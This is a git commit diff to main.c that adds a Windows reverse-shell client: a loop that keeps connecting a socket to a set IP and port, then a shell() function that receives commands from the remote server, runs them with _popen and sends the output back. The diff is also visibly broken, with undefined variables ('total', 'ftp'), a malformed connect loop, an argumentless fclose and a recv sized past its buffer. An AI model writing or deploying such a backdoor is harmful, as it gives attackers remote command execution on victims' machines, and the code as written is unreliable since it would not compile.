6e5a018ae323830effbdf06f3cdf8c94642c0125
David E Lares S <david.e.lares@gmail.com>
2018-01-28 10:29:28 -0600

    bzero content, q command and socket connection

--- main.c
+++ main.c
@@ -10,8 +10,49 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 
+// memset equivalent for linux bzero
+#define bzero(p, size) (void) memset((p), 0, (size))
+
 // global socket
 int sock;
+
+// shell
+void shell() {
+  char buffer[1024]; // commands received
+  char container[1024];
+  char response[18384];
+  // infinite loop
+  while(1) {
+    jump:
+    // allocating zeros
+    bzero(buffer, 1024);
+    bzero(container, sizeof(container));
+    bzero(response, sizeof(response));
+    // receiving functions - storing in buffer
+    recv(sock, buffer, sizeof(response), 0);
+
+    // commands comparison
+    if(strncmp("q", buffer, 1) == 0) {
+      // closing socket and program
+      closeSocket(sock);
+      WSACleanup();
+      exit(0);
+    } else {
+      // file descriptors
+      FILE * fp;
+      // run as process - run buffer
+      fp = _popen(buffer, "r");
+      // response can fit into 1024 bytes - place in container
+      while(fgets(container, 1024, ftp) != NULL) {
+        strcat(total, container); // adding the container content into total
+      }
+      // send total to the server
+      send(sock, total, sizeof(total), 0);
+      fclose()
+    }
+
+  }
+}
 
 // windows entrypoint
 int APIENTRY main(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
@@ -41,4 +82,13 @@ int APIENTRY main(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCm
   address.sin_family = AF_NET; // ipv4
   address.sin_addr.s_addr = inet_addr(ip); // IP address
   address.sin_port = htons(port); // port
+
+  start:
+  // perform the socket connection until the client is connected
+  while connect(sock, (struct sockaddr *), &address, sizeof(address)) != 0) {
+    Sleep(10);
+    goto start; // goto - start function
+  }
+
+  shell(); // receive commands from the server , execute it and send the result
 }
